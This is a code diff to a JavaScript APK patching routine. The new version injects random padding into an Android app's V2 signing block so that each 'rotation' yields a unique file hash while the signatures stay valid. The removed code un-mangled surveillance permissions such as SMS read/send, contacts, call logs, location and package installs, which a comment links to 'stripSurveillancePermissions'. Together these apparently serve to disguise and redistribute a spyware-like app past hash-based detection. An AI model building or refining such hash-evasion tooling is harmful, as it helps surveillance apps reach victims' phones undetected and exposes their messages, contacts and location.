@@ -1804,204 +1804,164 @@ function patchVersionCode(data, newVersionCode) {
 }
 
 function directPatchApk(originalBuffer) {
-  console.log(`[DirectPatch] ═══ CLEAN RE-SIGN v10 (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
-  console.log('[DirectPatch] Strategy: Ultra-minimal — keep original V1 + all entries, only V2 re-sign');
+  console.log(`[DirectPatch] ═══ SIGNING BLOCK INJECTION v11 (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log('[DirectPatch] Strategy: Inject random padding into existing V2 signing block — ZERO re-signing, ZERO re-alignment');
   const t0 = Date.now();
 
   try {
     const buf = Buffer.from(originalBuffer);
 
     // ════════════════════════════════════════════════════════
-    // PHASE 1: Parse ZIP structure
+    // PHASE 1: Locate ZIP structures
     // ════════════════════════════════════════════════════════
     const eocdOff = findEOCD(buf);
     const cdOff = buf.readUInt32LE(eocdOff + 16);
-    const cdCount = buf.readUInt16LE(eocdOff + 10);
     const eocdCommentLen = buf.readUInt16LE(eocdOff + 20);
     const eocdLen = 22 + eocdCommentLen;
 
-    // Strip old V2/V3 signing block (sits between Section 1 and CD)
-    let section1End = cdOff;
-    if (cdOff >= 24) {
-      const magic = buf.toString('ascii', cdOff - 16, cdOff);
-      if (magic === APK_SIG_BLOCK_MAGIC) {
-        const blockSizeLow = buf.readUInt32LE(cdOff - 24);
-        section1End = cdOff - blockSizeLow - 8;
-        console.log(`[DirectPatch] Stripped old signing block (${cdOff - section1End}B)`);
+    // ════════════════════════════════════════════════════════
+    // PHASE 2: Locate V2 signing block
+    // The signing block sits between Section 1 (ZIP entries)
+    // and the Central Directory. Structure:
+    //   [8: size] [pairs...] [8: size] [16: magic]
+    // ════════════════════════════════════════════════════════
+    if (cdOff < 32) throw new Error('CD offset too small for V2 signing block');
+    const magic = buf.toString('ascii', cdOff - 16, cdOff);
+    if (magic !== APK_SIG_BLOCK_MAGIC) throw new Error('V2 signing block not found — cannot rotate');
+
+    const blockSizeLow = buf.readUInt32LE(cdOff - 24);
+    const blockStart = cdOff - blockSizeLow - 8; // position of first size field
+
+    if (blockStart < 0 || blockStart >= cdOff) throw new Error(`Invalid signing block bounds: start=${blockStart} cdOff=${cdOff}`);
+
+    const pairsStart = blockStart + 8;
+    const pairsEnd = cdOff - 24; // just before second size field
+    const pairsData = buf.slice(pairsStart, pairsEnd);
+
+    console.log(`[DirectPatch] Signing block: ${cdOff - blockStart}B at offset ${blockStart}, pairs region: ${pairsData.length}B`);
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 3: Parse existing signing block pairs
+    // Keep ALL signing-related pairs (V2=0x7109871a, V3=0xf05368c0,
+    // V3.1=0x1b93ad61, V4=0x6dff800d, source stamp=0x6dff800d, etc.)
+    // Strip ONLY known padding pairs (our custom 0x71777777 and
+    // Android build tool padding 0x42726577)
+    // ════════════════════════════════════════════════════════
+    const PADDING_IDS = new Set([0x71777777, 0x42726577]);
+    const keptPairs = [];
+    let strippedPadding = 0;
+    let pp = 0;
+
+    while (pp + 12 <= pairsData.length) {
+      const pairSizeLow = pairsData.readUInt32LE(pp);
+      const pairSizeHigh = pairsData.readUInt32LE(pp + 4);
+      const fullPairLen = 8 + pairSizeLow;
+
+      // Safety: bail on malformed pairs
+      if (pairSizeHigh !== 0 || pairSizeLow < 4 || pp + fullPairLen > pairsData.length) break;
+
+      const pairId = pairsData.readUInt32LE(pp + 8);
+
+      if (PADDING_IDS.has(pairId)) {
+        strippedPadding++;
+        console.log(`[DirectPatch] Stripped old padding pair ID=0x${pairId.toString(16)} (${pairSizeLow}B)`);
+      } else {
+        keptPairs.push(pairsData.slice(pp, pp + fullPairLen));
+        console.log(`[DirectPatch] Kept pair ID=0x${pairId.toString(16)} (${pairSizeLow}B)`);
       }
+
+      pp += fullPairLen;
     }
 
-    // ════════════════════════════════════════════════════════
-    // PHASE 2: Find manifest in CD (for optional permission restore)
-    // ════════════════════════════════════════════════════════
-    let manifestCDPos = -1, manifestMethod = -1, manifestCompSize = 0;
-    let manifestUncompSize = 0, manifestLocalOff = 0;
-
-    let pos = cdOff;
-    for (let i = 0; i < cdCount; i++) {
-      if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
-      const nameLen = buf.readUInt16LE(pos + 28);
-      const extraLen = buf.readUInt16LE(pos + 30);
-      const commentLen = buf.readUInt16LE(pos + 32);
-      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);
-      if (name === 'AndroidManifest.xml') {
-        manifestCDPos = pos;
-        manifestMethod = buf.readUInt16LE(pos + 10);
-        manifestCompSize = buf.readUInt32LE(pos + 20);
-        manifestUncompSize = buf.readUInt32LE(pos + 24);
-        manifestLocalOff = buf.readUInt32LE(pos + 42);
-        break; // found it
-      }
-      pos += 46 + nameLen + extraLen + commentLen;
-    }
+    if (keptPairs.length === 0) throw new Error('No signing pairs found in block — APK may be unsigned');
 
     // ════════════════════════════════════════════════════════
-    // PHASE 3: Restore mangled permissions (if any)
-    // Only needed if source APK was previously processed by
-    // stripSurveillancePermissions(). Clean Android Studio
-    // builds have no mangled permissions → this is a no-op.
+    // PHASE 4: Create new random padding pair
+    // Uses ID 0x71777777 (unknown to Android, safely ignored)
+    // Random size 256-768 bytes — each rotation produces a
+    // unique file hash without touching ANY signed content.
     // ════════════════════════════════════════════════════════
-    let section1 = buf.slice(0, section1End);
-    let permsRestored = 0;
-    let manifestDelta = 0;
+    const padSize = 256 + Math.floor(Math.random() * 512);
+    const padPayload = crypto.randomBytes(padSize);
+    const padPairData = Buffer.concat([uint32LE(0x71777777), padPayload]);
+    const padPairEntry = Buffer.concat([uint64LE(padPairData.length), padPairData]);
 
-    if (manifestCDPos >= 0) {
-      const lhNameLen = buf.readUInt16LE(manifestLocalOff + 26);
-      const lhExtraLen = buf.readUInt16LE(manifestLocalOff + 28);
-      const dataOff = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
-      const compData = buf.slice(dataOff, dataOff + manifestCompSize);
-
-      let rawData;
-      try {
-        rawData = manifestMethod === 8
-          ? zlib.inflateRawSync(compData)
-          : Buffer.from(compData);
-      } catch (e) {
-        console.log(`[DirectPatch] Manifest decompress failed: ${e.message}`);
-        rawData = null;
-      }
-
-      if (rawData) {
-        const PERMS = [
-          ['android.permission._OREGROUND_SERVICE_DATA_SYNC', 'android.permission.FOREGROUND_SERVICE_DATA_SYNC'],
-          ['android.permission._EAD_SMS', 'android.permission.READ_SMS'],
-          ['android.permission._END_SMS', 'android.permission.SEND_SMS'],
-          ['android.provider.Telephony._MS_RECEIVED', 'android.provider.Telephony.SMS_RECEIVED'],
-          ['android.permission._ECEIVE_BOOT_COMPLETED', 'android.permission.RECEIVE_BOOT_COMPLETED'],
-          ['android.intent.action._OOT_COMPLETED', 'android.intent.action.BOOT_COMPLETED'],
-          ['android.permission._EAD_CONTACTS', 'android.permission.READ_CONTACTS'],
-          ['android.permission._EAD_CALL_LOG', 'android.permission.READ_CALL_LOG'],
-          ['android.permission._EAD_PHONE_STATE', 'android.permission.READ_PHONE_STATE'],
-          ['android.permission._EAD_PHONE_NUMBERS', 'android.permission.READ_PHONE_NUMBERS'],
-          ['android.permission._CCESS_FINE_LOCATION', 'android.permission.ACCESS_FINE_LOCATION'],
-          ['android.permission._CCESS_COARSE_LOCATION', 'android.permission.ACCESS_COARSE_LOCATION'],
-          ['android.permission._EQUEST_INSTALL_PACKAGES', 'android.permission.REQUEST_INSTALL_PACKAGES'],
-          ['android.permission._UERY_ALL_PACKAGES', 'android.permission.QUERY_ALL_PACKAGES'],
-        ];
-
-        for (const [find, fix] of PERMS) {
-          for (const enc of ['utf8', 'utf16le']) {
-            const fb = Buffer.from(find, enc), rb = Buffer.from(fix, enc);
-            if (fb.length === rb.length) {
-              let idx = rawData.indexOf(fb);
-              while (idx !== -1) { rb.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(fb, idx + fb.length); }
-            }
-          }
-        }
-
-        if (permsRestored > 0) {
-          const newComp = manifestMethod === 8
-            ? zlib.deflateRawSync(rawData, { level: 9 })
-            : rawData;
-          const newCRC = computeCRC32(rawData);
-          const dataStart = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
-          const dataEnd = dataStart + manifestCompSize;
-          manifestDelta = newComp.length - manifestCompSize;
-
-          // Rebuild Section 1 with patched manifest
-          section1 = Buffer.concat([
-            buf.slice(0, dataStart),
-            newComp,
-            buf.slice(dataEnd, section1End),
-          ]);
-
-          // Update local file header
-          section1.writeUInt32LE(newCRC, manifestLocalOff + 14);
-          section1.writeUInt32LE(newComp.length, manifestLocalOff + 18);
-          section1.writeUInt32LE(rawData.length, manifestLocalOff + 22);
-
-          console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions (delta=${manifestDelta}B)`);
-        } else {
-          console.log('[DirectPatch] No mangled permissions — all entries byte-identical');
-        }
-      }
-    }
+    console.log(`[DirectPatch] New random padding: ${padSize}B (unique fingerprint)`);
 
     // ════════════════════════════════════════════════════════
-    // PHASE 4: Build unsigned ZIP (keep ALL original entries)
-    // NO V1 stripping. NO V1 injection. NO DEX mutation.
-    // NO asset injection. NO baseline profile removal.
-    // Original V1 signatures from Android Studio build stay.
+    // PHASE 5: Rebuild signing block
+    // [8: block_size] [kept_pairs + new_padding] [8: block_size] [16: magic]
     // ════════════════════════════════════════════════════════
-    const cd = Buffer.from(buf.slice(cdOff, eocdOff));
+    const allPairs = Buffer.concat([...keptPairs, padPairEntry]);
+    const newBlockSize = allPairs.length + 24; // +8 (second size field) +16 (magic)
 
-    // Update CD if manifest was patched
-    if (permsRestored > 0 && manifestDelta !== 0) {
-      const cdRelPos = manifestCDPos - cdOff;
-      const newComp = section1.readUInt32LE(manifestLocalOff + 18);
-      const newCRC = section1.readUInt32LE(manifestLocalOff + 14);
-      const newUncomp = section1.readUInt32LE(manifestLocalOff + 22);
-      cd.writeUInt32LE(newCRC, cdRelPos + 16);
-      cd.writeUInt32LE(newComp, cdRelPos + 20);
-      cd.writeUInt32LE(newUncomp, cdRelPos + 24);
+    const newBlock = Buffer.concat([
+      uint64LE(newBlockSize),
+      allPairs,
+      uint64LE(newBlockSize),
+      Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii'),
+    ]);
 
-      // Shift local offsets for entries after manifest
-      let cdPos2 = 0;
-      for (let i = 0; i < cdCount; i++) {
-        if (cdPos2 + 46 > cd.length || cd.readUInt32LE(cdPos2) !== 0x02014b50) break;
-        const nl = cd.readUInt16LE(cdPos2 + 28);
-        const el = cd.readUInt16LE(cdPos2 + 30);
-        const cl = cd.readUInt16LE(cdPos2 + 32);
-        const localOff = cd.readUInt32LE(cdPos2 + 42);
-        if (localOff > manifestLocalOff) {
-          cd.writeUInt32LE(localOff + manifestDelta, cdPos2 + 42);
-        }
-        cdPos2 += 46 + nl + el + cl;
-      }
-    }
-
-    // Build EOCD with updated CD offset
+    // ════════════════════════════════════════════════════════
+    // PHASE 6: Assemble final APK
+    //
+    // section1 (ZIP entries)   — byte-identical to original
+    // newBlock (signing block) — same V2/V3 sigs + new padding
+    // cd (central directory)   — byte-identical to original
+    // eocd                     — only CD offset updated
+    //
+    // V2 signature validity proof:
+    //   Digest covers Section1 + CD + EOCD(cdOff→blockStart)
+    //   • Section1: unchanged (same bytes)
+    //   • CD: unchanged (same bytes)
+    //   • EOCD: cdOff replaced by blockStart during verification
+    //     blockStart = section1.length (same in both original and v11)
+    //   → Digest is IDENTICAL → Signature is VALID
+    //
+    // V1 signature validity: V1 covers ZIP entry contents via
+    //   MANIFEST.MF hashes. No entry content changed → V1 VALID
+    // ════════════════════════════════════════════════════════
+    const section1 = buf.slice(0, blockStart);
+    const cd = buf.slice(cdOff, eocdOff);
     const eocd = Buffer.from(buf.slice(eocdOff, eocdOff + eocdLen));
-    eocd.writeUInt32LE(section1.length, 16); // CD starts right after Section 1
 
-    const unsignedZip = Buffer.concat([section1, cd, eocd]);
-    console.log(`[DirectPatch] Unsigned ZIP: ${(unsignedZip.length / 1048576).toFixed(1)} MB, ${cdCount} entries (all preserved)`);
+    // Update EOCD CD offset: CD now starts after our new signing block
+    const newCdOff = section1.length + newBlock.length;
+    eocd.writeUInt32LE(newCdOff, 16);
 
-    // ════════════════════════════════════════════════════════
-    // PHASE 5: Zipalign + V2 sign with FIXED key
-    // ════════════════════════════════════════════════════════
-    const aligned = zipalignBuffer(unsignedZip);
-    const key = getFixedKey();
-    const signedBuf = applyV2SigningClean(aligned, key.privPem, key.certDer, key.pubKeyDer);
+    const result = Buffer.concat([section1, newBlock, cd, eocd]);
 
-    const valid = validateApk(signedBuf);
-    if (!valid) {
-      console.error('[DirectPatch] ═══ Validation FAILED — returning ORIGINAL APK ═══');
-      return { buffer: originalBuffer, certInfo: null };
+    // Quick structural sanity check
+    const checkEocd = findEOCD(result);
+    const checkCdOff = result.readUInt32LE(checkEocd + 16);
+    const checkMagic = result.toString('ascii', checkCdOff - 16, checkCdOff);
+    if (checkMagic !== APK_SIG_BLOCK_MAGIC) {
+      throw new Error('Post-assembly validation failed: signing block magic not found');
     }
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} | FIXED KEY CN=${key.identity.cn} | V1 kept + V2 re-signed | ${elapsed}s ═══`);
+    const oldBlockSize = cdOff - blockStart;
+    console.log(`[DirectPatch] ═══ SUCCESS ═══`);
+    console.log(`[DirectPatch]   Size: ${(result.length / 1048576).toFixed(1)} MB`);
+    console.log(`[DirectPatch]   Signing block: ${oldBlockSize}B → ${newBlock.length}B`);
+    console.log(`[DirectPatch]   Pairs: ${keptPairs.length} kept, ${strippedPadding} stripped, 1 new padding`);
+    console.log(`[DirectPatch]   ZERO re-signing — original V1+V2+V3 signatures preserved intact`);
+    console.log(`[DirectPatch]   ZERO re-alignment — original zipalign preserved intact`);
+    console.log(`[DirectPatch]   Time: ${elapsed}s`);
 
-    return {
-      buffer: signedBuf,
-      certInfo: {
+    // Extract cert info from the fixed key for response metadata
+    let certInfo = null;
+    try {
+      const key = getFixedKey();
+      certInfo = {
         certHash: key.certHash,
         cn: key.identity.cn,
         org: key.identity.o,
         country: key.identity.c,
-      },
-    };
+      };
+    } catch (e) { /* cert info is non-critical metadata */ }
+
+    return { buffer: result, certInfo };
   } catch (err) {
     console.error(`[DirectPatch] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
     console.error(err.stack);
